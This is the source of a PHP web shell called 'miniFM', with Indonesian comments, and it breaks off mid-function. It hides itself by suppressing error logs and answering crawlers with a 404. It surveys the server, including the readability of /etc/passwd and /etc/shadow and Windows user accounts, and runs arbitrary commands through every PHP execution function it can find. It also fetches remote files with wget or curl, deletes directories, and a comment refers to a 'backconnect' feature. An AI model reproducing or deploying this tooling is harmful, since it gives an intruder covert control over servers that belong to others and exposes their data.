<?php
@error_reporting(0);
@ini_set('display_errors','Off');
@ini_set('ignore_repeated_errors',0);
@ini_set('log_errors','Off');
@ini_set('max_execution_time',0);
@ini_set('memory_limit', '128M');
$stitle = "miniFM"; /* jangan diganti kalo kamu ingin fitur backconnect tetap bekerja! */
$sfooter = "[ orang_dalam ]"; /* diganti gkpp, gk ngaruh! */
$auth_pass = '$2y$10$u0LRXNXe3JeFZuQSrIrASu3Puc.wNLrtXWvRntANJ8h03Xfnnr4YK';
$webprotocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ? 'https://' : 'http://';
$weburl	= $webprotocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
$lokasiberkas = cwd() ? str_replace('\\','/', cwd()) : $_SERVER['DOCUMENT_ROOT'];
$os = strtolower(substr(PHP_OS,0,3)) == "win" ? 'win' : 'nix';
$chunk_size = 4096;
if(!isset($_SESSION)){session_start();}
if(!function_exists('array_column')){
	function array_column(array $input, $columnKey, $indexKey = null){
		$array = array();
		foreach($input as $value){
			if(!array_key_exists($columnKey, $value)){trigger_error("Key {$columnKey} does not exist in array"); return false;}
			if(is_null($indexKey)){
				$array[] = $value[$columnKey];
			} else {
				if(!array_key_exists($indexKey, $value)){trigger_error("Key {$indexKey} does not exist in array");return false;}
				if(!is_scalar($value[$indexKey])){trigger_error("Key {$indexKey} does not contain scalar value");return false;}
				$array[$value[$indexKey]] = $value[$columnKey];
			}
		}
		return $array;
	}
}
function blockCrawler(){
    if (empty($_SERVER['HTTP_USER_AGENT'])) {
        return;
    }

    $ua = ["Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl"];
    if (preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit(0);
    }
}

function fType($a, $c = '2em') {
    $icons = [
        'logo' => 'https://clipart-library.com/data_images/554935.png',
        'home' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--cyan)" d="M575.8 255.5c0 18-15 32.1-32 32.1h-32l.7 160.2c0 2.7-.2 5.4-.5 8.1V472c0 22.1-17.9 40-40 40H456c-1.1 0-2.2 0-3.3-.1c-1.4 .1-2.8 .1-4.2 .1H416 392c-22.1 0-40-17.9-40-40V448 384c0-17.7-14.3-32-32-32H256c-17.7 0-32 14.3-32 32v64 24c0 22.1-17.9 40-40 40H160 128.1c-1.5 0-3-.1-4.5-.2c-1.2 .1-2.4 .2-3.6 .2H104c-22.1 0-40-17.9-40-40V360c0-.9 0-1.9 .1-2.8V287.6H32c-18 0-32-14-32-32.1c0-9 3-17 10-24L266.4 8c7-7 15-8 22-8s15 2 21 7L564.8 231.5c8 7 12 15 11 24z"/></svg>',
        'dir' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>',
        'php' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm97 289c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0L79 303c-9.4 9.4-9.4 24.6 0 33.9l48 48c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-31-31 31-31zM257 255c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9l31 31-31 31c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l48-48c9.4-9.4 9.4-24.6 0-33.9l-48-48z"/></svg>',
        'zip' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16h48c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16h48v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm48 112c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm0 64c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm-6.3 71.8L82.1 335.9c-1.4 5.4-2.1 10.9-2.1 16.4c0 35.2 28.8 63.7 64 63.7s64-28.5 64-63.7c0-5.5-.7-11.1-2.1-16.4l-23.5-88.2c-3.7-14-16.4-23.8-30.9-23.8H136.6c-14.5 0-27.2 9.7-30.9 23.8zM128 336h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H128c-8.8 0-16-7.2-16-16s7.2-16 16-16z"/></svg>',
        'img' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160H256c-17.7 0-32-14.3-32-32V0H64zM256 0V128H384L256 0zM64 256a32 32 0 1 1 64 0 32 32 0 1 1 -64 0zm152 32c5.3 0 10.2 2.6 13.2 6.9l88 128c3.4 4.9 3.7 11.3 1 16.5s-8.2 8.6-14.2 8.6H216 176 128 80c-5.8 0-11.1-3.1-13.9-8.1s-2.8-11.2 .2-16.1l48-80c2.9-4.8 8.1-7.8 13.7-7.8s10.8 2.9 13.7 7.8l12.8 21.4 48.3-70.2c3-4.3 7.9-6.9 13.2-6.9z"/></svg>',
        'txt' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>',
        'css' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M480 32l-64 368-223.3 80L0 400l19.6-94.8h82l-8 40.6L210 390.2l134.1-44.4 18.8-97.1H29.5l16-82h333.7l10.5-52.7H56.3l16.3-82H480z"/></svg>',
        'js' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M0 32v448h448V32H0zm243.8 349.4c0 43.6-25.6 63.5-62.9 63.5-33.7 0-53.2-17.4-63.2-38.5l34.3-20.7c6.6 11.7 12.6 21.6 27.1 21.6 13.8 0 22.6-5.4 22.6-26.5V237.7h42.1v143.7zm99.6 63.5c-39.1 0-64.4-18.6-76.7-43l34.3-19.8c9 14.7 20.8 25.6 41.5 25.6 17.4 0 28.6-8.7 28.6-20.8 0-14.4-11.4-19.5-30.7-28l-10.5-4.5c-30.4-12.9-50.5-29.2-50.5-63.5 0-31.6 24.1-55.6 61.6-55.6 26.8 0 46 9.3 59.8 33.7L368 290c-7.2-12.9-15-18-27.1-18-12.3 0-20.1 7.8-20.1 18 0 12.6 7.8 17.7 25.9 25.6l10.5 4.5c35.8 15.3 55.9 31 55.9 66.2 0 37.8-29.8 58.6-69.7 58.6z"/></svg>',
        'html' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M0 32l34.9 395.8L191.5 480l157.6-52.2L384 32H0zm308.2 127.9H124.4l4.1 49.4h175.6l-13.6 148.4-97.9 27v.3h-1.1l-98.7-27.3-6-75.8h47.7L138 320l53.5 14.5 53.7-14.5 6-62.2H84.3L71.5 112.2h241.1l-4.4 47.7z"/></svg>',
        'other' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M320 464c8.8 0 16-7.2 16-16V160H256c-17.7 0-32-14.3-32-32V48H64c-8.8 0-16 7.2-16 16V448c0 8.8 7.2 16 16 16H320zM0 64C0 28.7 28.7 0 64 0H229.5c17 0 33.3 6.7 45.3 18.7l90.5 90.5c12 12 18.7 28.3 18.7 45.3V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V64z"/></svg>',
        'info' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M384 96V320H64L64 96H384zM64 32C28.7 32 0 60.7 0 96V320c0 35.3 28.7 64 64 64H181.3l-10.7 32H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H352c17.7 0 32-14.3 32-32s-14.3-32-32-32H277.3l-10.7-32H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm464 0c-26.5 0-48 21.5-48 48V432c0 26.5 21.5 48 48 48h64c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48H528zm16 64h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16s7.2-16 16-16zm-16 80c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16zm32 160a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>',
        'edit' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="' . $c . '"><path fill="var(--cyan)" d="M471.6 21.7c-21.9-21.9-57.3-21.9-79.2 0L362.3 51.7l97.9 97.9 30.1-30.1c21.9-21.9 21.9-57.3 0-79.2L471.6 21.7zm-299.2 220c-6.1 6.1-10.8 13.6-13.5 21.9l-29.6 88.8c-2.9 8.6-.6 18.1 5.8 24.6s15.9 8.7 24.6 5.8l88.8-29.6c8.2-2.7 15.7-7.4 21.9-13.5L437.7 172.3 339.7 74.3 172.4 241.7zM96 64C43 64 0 107 0 160V416c0 53 43 96 96 96H352c53 0 96-43 96-96V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v96c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V160c0-17.7 14.3-32 32-32h96c17.7 0 32-14.3 32-32s-14.3-32-32-32H96z"/></svg>',
        'cmd' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>',
        'bc' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M80.3 44C69.8 69.9 64 98.2 64 128s5.8 58.1 16.3 84c6.6 16.4-1.3 35-17.7 41.7s-35-1.3-41.7-17.7C7.4 202.6 0 166.1 0 128S7.4 53.4 20.9 20C27.6 3.6 46.2-4.3 62.6 2.3S86.9 27.6 80.3 44zM555.1 20C568.6 53.4 576 89.9 576 128s-7.4 74.6-20.9 108c-6.6 16.4-25.3 24.3-41.7 17.7S489.1 228.4 495.7 212c10.5-25.9 16.3-54.2 16.3-84s-5.8-58.1-16.3-84C489.1 27.6 497 9 513.4 2.3s35 1.3 41.7 17.7zM352 128c0 23.7-12.9 44.4-32 55.4V480c0 17.7-14.3 32-32 32s-32-14.3-32-32V183.4c-19.1-11.1-32-31.7-32-55.4c0-35.3 28.7-64 64-64s64 28.7 64 64zM170.6 76.8C163.8 92.4 160 109.7 160 128s3.8 35.6 10.6 51.2c7.1 16.2-.3 35.1-16.5 42.1s-35.1-.3-42.1-16.5c-10.3-23.6-16-49.6-16-76.8s5.7-53.2 16-76.8c7.1-16.2 25.9-23.6 42.1-16.5s23.6 25.9 16.5 42.1zM464 51.2c10.3 23.6 16 49.6 16 76.8s-5.7 53.2-16 76.8c-7.1 16.2-25.9 23.6-42.1 16.5s-23.6-25.9-16.5-42.1c6.8-15.6 10.6-32.9 10.6-51.2s-3.8-35.6-10.6-51.2c-7.1-16.2 .3-35.1 16.5-42.1s35.1 .3 42.1 16.5z"/></svg>',
        'sql' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M448 80v48c0 44.2-100.3 80-224 80S0 172.2 0 128V80C0 35.8 100.3 0 224 0S448 35.8 448 80zM393.2 214.7c20.8-7.4 39.9-16.9 54.8-28.6V288c0 44.2-100.3 80-224 80S0 332.2 0 288V186.1c14.9 11.8 34 21.2 54.8 28.6C99.7 230.7 159.5 240 224 240s124.3-9.3 169.2-25.3zM0 346.1c14.9 11.8 34 21.2 54.8 28.6C99.7 390.7 159.5 400 224 400s124.3-9.3 169.2-25.3c20.8-7.4 39.9-16.9 54.8-28.6V432c0 44.2-100.3 80-224 80S0 476.2 0 432V346.1z"/></svg>',
        'out' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="' . $c . '"><path fill="var(--cyan)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>',
        'loader' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="' . $c . '"><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="#2be2ff" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>',
    ];
    return $icons[$a] ?? '';
}
function cwd() {
    if (function_exists('realpath')) {
        return realpath('.');
    }
    if (function_exists('getcwd')) {
        return getcwd();
    }
    return '';
}

function listdirs($dir) {
    if (function_exists('scandir')) {
        return scandir($dir);
    }

    if (!is_dir($dir) || !function_exists('opendir')) {
        return [];
    }

    $files = [];
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false) {
            $files[] = $file;
        }
        closedir($handle);
    }
    return $files;
}
function disFunc(){ $df = function_exists('ini_get') ? @ini_get('disable_functions') : ''; return (!empty($df) ? explode(',', $df) : array());}
function isFunctionEnabled($functionName) {
    if (!function_exists($functionName)) {
        return false;
    }
    $disabledFunctions = @ini_get('disable_functions');
    if ($disabledFunctions) {
        $disabled = explode(',', $disabledFunctions);
        return !in_array($functionName, array_map('trim', $disabled));
    }
    return true;
}

function AvFunc($list = []) {
    foreach ($list as $entry) {
        if (isFunctionEnabled($entry)) {
            return true;
        }
    }
    return false;
}
function serverSecInfo() {
    $sInfo = [];

    function showInf($n, $v) {
        $v = trim($v);
        if (empty($v)) {
            return '';
        }
        $content = (strpos($v, "\n") === false)
            ? '<footer class="blockquote-footer" style="color:#cfdce8!important;">' . htmlspecialchars($v) . '</footer>'
            : '<footer class="blockquote-footer"><pre class="pre-scrollable mb-0">' . htmlspecialchars($v) . '</pre></footer>';
        return '<p class="mt-3 mb-0 text-cyan">' . htmlspecialchars($n) . ': </p>' . $content;
    }

    $sInfo[] = showInf('System', php_uname());
    $sInfo[] = showInf('Server software', $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown');
    if (isFunctionEnabled('gethostbyname')) {
        $sInfo[] = showInf('Server ip', gethostbyname($_SERVER['HTTP_HOST']));
    }

    $panels = [
        '/usr/local/cpanel' => 'cPanel', '/usr/local/hpanel' => 'hPanel (Hostinger)',
        '/usr/local/psa' => 'Plesk', '/usr/local/webuzo' => 'Webuzo',
        '/usr/local/vesta' => 'Vesta CP', '/usr/share/webmin' => 'Virtualmin',
        '/www/server/panel' => 'aaPanel', '/opt/neoistone' => 'NS Panel',
        '/etc/neoistone' => 'NS Panel', '/usr/local/neoistone' => 'NS Panel',
        '/usr/local/mgr5' => 'ISP Manager', '/usr/local/mgr6' => 'ISP Manager',
        '/usr/local/home/admispconfig' => 'ISP Config', '/usr/local/directadmin' => 'Direct Admin',
        '/usr/local/solusvm/www' => 'SolusVM', '/usr/local/lxlabs/kloxo' => 'Kloxo',
        '/usr/local/cwp' => 'CentOS WebPanel', '/usr/local/cwpsrv' => 'CentOS WebPanel',
        '/var/www/html/froxlor-latest' => 'Froxlor', '/var/www/html/froxlor' => 'Froxlor',
        '/etc/ajenti/' => 'Ajenti'
    ];
    $foundPanels = [];
    foreach ($panels as $path => $panel) {
        if (is_dir($path)) {
            $foundPanels[] = $panel;
        }
    }
    $sInfo[] = showInf('Server panel', empty($foundPanels) ? 'Unknown' : implode(', ', array_unique($foundPanels)));

    if (isFunctionEnabled('ini_get')) {
        $sInfo[] = showInf('Open base dir', ini_get('open_basedir'));
        $sInfo[] = showInf('Safe mode', ini_get('safe_mode') ? 'ON' : 'OFF');
        $sInfo[] = showInf('Safe mode exec dir', ini_get('safe_mode_exec_dir'));
        $sInfo[] = showInf('Safe mode include dir', ini_get('safe_mode_include_dir'));
    }

    $sInfo[] = showInf('PHP Version', phpversion());
    $sInfo[] = showInf('Disabled PHP Functions', implode(', ', disFunc()));

    if (isFunctionEnabled('apache_get_modules')) {
        $sInfo[] = showInf('Loaded Apache modules', implode(', ', apache_get_modules()));
    }

    if (isFunctionEnabled('curl_version')) {
        $curlVer = curl_version();
        $sInfo[] = showInf('cURL support', 'Yes (' . $curlVer['version'] . ')');
    }

    $databases = [];
    if (isFunctionEnabled('mysql_get_client_info')) $databases[] = "MySQL (" . mysql_get_client_info() . ")";
    if (class_exists('mysqli')) $databases[] = "MySQLi (" . mysqli_get_client_info() . ")";
    if (isFunctionEnabled('mssql_connect')) $databases[] = "MSSQL";
    if (isFunctionEnabled('pg_connect')) $databases[] = "PostgreSQL";
    if (isFunctionEnabled('oci_connect')) $databases[] = "Oracle";
    if (isFunctionEnabled('odbc_connect')) $databases[] = "ODBC";
    if (isFunctionEnabled('sqlite_open')) $databases[] = "SQLite";
    if (class_exists('SQLite3')) $databases[] = "SQLite3";
    if (class_exists('PDO')) $databases[] = "PDO";
    $sInfo[] = showInf('Databases', implode(', ', $databases));

    if ($GLOBALS['os'] === 'nix') {
        if (isFunctionEnabled('file_get_contents')) {
            $sInfo[] = showInf('OS Version', @file_get_contents('/proc/version'));
            $sInfo[] = showInf('Distro name', @file_get_contents('/etc/issue.net'));
        }
        if (isFunctionEnabled('is_readable')) {
            $sInfo[] = showInf('Readable /etc/passwd', is_readable('/etc/passwd') ? "Yes" : "No");
            $sInfo[] = showInf('Readable /etc/shadow', is_readable('/etc/shadow') ? "Yes" : "No");
        }
    } else {
        $sInfo[] = showInf('OS Version', base64_decode(perintahnya("ver", $_SESSION['path'])['stdout']));
        if (isFunctionEnabled('iconv')) {
            $sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net accounts", $_SESSION['path'])['stdout'])));
            $sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net user", $_SESSION['path'])['stdout'])));
            $sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("systeminfo", $_SESSION['path'])['stdout'])));
        }
    }

    return array_values(array_filter(array_unique($sInfo)));
}
function transferFile($xurl, $xpath, $xname) {
    set_time_limit(0);
    $fName = $xpath . "/" . $xname;

    if (!is_writable($xpath)) {
        return [$xname . ' failed! (permission denied)'];
    }

    $methods = [
        'file_put_contents' => function ($url, $file) {
            return file_put_contents($file, file_get_contents($url));
        },
        'copy' => function ($url, $file) {
            return copy($url, $file);
        },
        'curl' => function ($url, $file) {
            if (!function_exists('curl_init')) return false;
            $ch = curl_init($url);
            $fp = fopen($file, 'w');
            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            $success = curl_exec($ch);
            curl_close($ch);
            fclose($fp);
            return $success;
        },
        'wget' => function ($url, $file, $path) {
            $response = perintahnya('wget -c ' . escapeshellarg($url) . ' -O ' . escapeshellarg($file), $path);
            return !empty($response['stdout']);
        }
    ];

    foreach ($methods as $method => $callback) {
        if (file_exists($fName)) {
            @unlink($fName);
        }
        if ($callback($xurl, $fName, $xpath)) {
            return [file_exists($fName) ? $xname . " uploaded!" : $xname . " failed!"];
        }
    }

    return [$xname . ' failed! (no suitable method found)'];
}
function addDirToZip($zip, $dir, $basePath) {
    if (!class_exists('ZipArchive')) {
        return;
    }
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $file) {
        $relativePath = $basePath . '/' . $iterator->getSubPathName();
        if ($file->isDir()) {
            $zip->addEmptyDir($relativePath);
        } else {
            $zip->addFile($file->getRealPath(), $relativePath);
        }
    }
}
function executeCommand($cmd) {
    $output = '';
    $chunk_size = 4096;

    if (isFunctionEnabled('proc_open')) {
        $descriptors = [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            $output .= stream_get_contents($pipes[1]);
            $output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    } elseif (isFunctionEnabled('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        while (!feof($handle)) {
            $output .= fread($handle, $chunk_size);
        }
        pclose($handle);
    } elseif (isFunctionEnabled('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (isFunctionEnabled('exec')) {
        exec($cmd . ' 2>&1', $lines);
        $output = implode("\n", $lines);
    } elseif (isFunctionEnabled('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (isFunctionEnabled('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    }

    return $output;
}
function expandPath($path) {
    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ perintahnya("echo $match[1]", $stdout); return $stdout[0] . $match[2];}
    return $path;
}
function perintahnya($cmdx, $path) {
    if (function_exists('chdir')) {
        @chdir($path);
    }

    $stdout = '';
    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmdx)) {
        if (function_exists('chdir')) {
            @chdir(expandPath("~"));
        }
    } elseif (preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmdx, $match)) {
        if (function_exists('chdir')) {
            @chdir(expandPath($match[1]));
        }
    } else {
        $stdout = executeCommand($cmdx);
    }

    $user = 'unknown';
    if (isFunctionEnabled('posix_getpwuid') && isFunctionEnabled('posix_geteuid')) {
        $pwuid = posix_getpwuid(posix_geteuid());
        $user = $pwuid['name'];
    } elseif (isFunctionEnabled('getenv')) {
        $user = getenv('USERNAME') ?: 'unknown';
    }

    $hostname = isFunctionEnabled('gethostname') ? gethostname() : 'localhost';
    $_SESSION['path'] = cwd();

    return [
        'userhost' => base64_encode($user . "@" . $hostname),
        'path' => base64_encode($_SESSION['path']),
        'stdout' => base64_encode($stdout)
    ];
}
function statusnya($file) {
    $perms = @fileperms($file);

    if ($perms === false) {
        return 'u?????????';
    }

    $info = '';
    // File type
    if (($perms & 0xC000) == 0xC000) $info = 's'; // Socket
    elseif (($perms & 0xA000) == 0xA000) $info = 'l'; // Symbolic Link
    elseif (($perms & 0x8000) == 0x8000) $info = '-'; // Regular
    elseif (($perms & 0x6000) == 0x6000) $info = 'b'; // Block special
    elseif (($perms & 0x4000) == 0x4000) $info = 'd'; // Directory
    elseif (($perms & 0x2000) == 0x2000) $info = 'c'; // Character special
    elseif (($perms & 0x1000) == 0x1000) $info = 'p'; // FIFO pipe
    else $info = 'u'; // Unknown

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
function stColor($f){$colors = '';if(!@is_readable($f)){$colors = 'text-danger';} else if(!@is_writable($f)){$colors = 'text-warning';} else {$colors = 'text-success';}return $colors;}
function owner($filename) {
    $owner = '?';
    $group = '?';

    if (isFunctionEnabled('fileowner')) {
        $ownerId = @fileowner($filename);
        if ($ownerId !== false && isFunctionEnabled('posix_getpwuid')) {
            $ownerInfo = @posix_getpwuid($ownerId);
            if ($ownerInfo) {
                $owner = $ownerInfo['name'];
            }
        }
    }

    if (isFunctionEnabled('filegroup')) {
        $groupId = @filegroup($filename);
        if ($groupId !== false && isFunctionEnabled('posix_getgrgid')) {
            $groupInfo = @posix_getgrgid($groupId);
            if ($groupInfo) {
                $group = $groupInfo['name'];
            }
        }
    }

    return ['owner' => $owner, 'group' => $group];
}
function sizeFilter($bytes) {
    if ($bytes === false) {
        return 'N/A';
    }
    $label = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($label) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . " " . $label[$i];
}

function countDir($filename) {
    $files = listdirs($filename);
    return is_array($files) ? count($files) - 2 : 0;
}

function xrmdir($dir) {
    $items = listdirs($dir);
    if (!is_array($items)) {
        return;
    }
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            @unlink($path);
        }
    }
    @rmdir($dir);
}
function gandakanDir($source, $destination) {
    if (!is_dir($source)) {
        return false;
    }
    if (!file_exists($destination)) {
        if (!@mkdir($destination, 0777, true)) {
            return false;
        }
    }
    $items = listdirs($source);
    if (!is_array($items)) {
        return false;
    }
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $sourceItem = $source . '/' . $item;
        $destinationItem = $destination . '/' . $item;
        if (is_dir($sourceItem)) {
            if (!gandakanDir($sourceItem, $destinationItem)) {
                return false;
            }
        } else {
            if (!@copy($sourceItem, $destinationItem)) {
                return false;
            }
        }
    }
    return true;
}
function urutberkas($a) {
    $items = listdirs($a);
    if (!is_array($items)) {
        return [];
    }

    $files = [];
    $dirs = [];

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $a . '/' . $item;
        $entry = [
            'entry' => $item,
            'entry_path' => $a,
            'full_path' => $path
        ];
        if (is_dir($path)) {
            $dirs[] = array_merge($entry, ['type' => 'dir']);
        } else {
            $files[] = array_merge($entry, ['type' => 'file']);
        }
    }

    // Sort directories and files separately
    usort($dirs, function ($a, $b) {
